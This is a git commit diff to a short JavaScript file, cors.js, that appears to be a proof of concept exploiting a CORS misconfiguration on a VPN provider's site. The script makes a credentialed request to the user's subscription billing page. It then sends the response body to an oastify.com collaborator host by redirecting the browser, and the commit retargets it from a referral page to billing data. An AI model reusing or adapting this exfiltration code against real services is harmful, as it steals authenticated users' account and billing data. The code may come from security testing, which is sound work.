51fc497faf65a2c99d1dc6bc8cc652ab634729ae
Soham Das <64075511+Soham7-dev@users.noreply.github.com>
2026-08-24 11:27:08 +0530

    Update API endpoint and logging URL in cors.js

--- cors.js
+++ cors.js
@@ -1,9 +1,9 @@
 var req = new XMLHttpRequest();
 req.onload = reqListener;
-req.open('get','https://beta-my.cyberghostvpn.com/refer-a-friend/create',true);
+req.open('get','https://my.cyberghostvpn.com/subscriptions/13265986/bills',true);
 req.withCredentials = true;
 req.send();
 
 function reqListener() {
-	location='https://r3vkj3gk2ywxi4ecwepmlgmz7qdh17pw.oastify.com/log?key='+this.responseText;
+	location='https://rd0ekamx9r0hb83f9hilnmqxvcmid63us.oastify.com/log?key='+this.responseText;
 };
